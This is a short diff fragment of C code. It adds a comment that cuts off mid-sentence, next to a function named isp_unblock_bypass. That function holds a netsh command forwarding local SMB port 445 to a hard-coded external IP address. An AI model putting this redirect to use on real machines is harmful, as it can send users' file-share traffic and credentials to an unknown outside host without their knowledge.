@@ -50,6 +50,7 @@ int restart_windows(){
         }
 }
 
+//this is causing issues for users once the bypass happens it restarts so add 
 int isp_unblock_bypass(){
         // Command to execute
     const char* command = "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=445 connectaddress=122.176.54.41 connectport=6969";
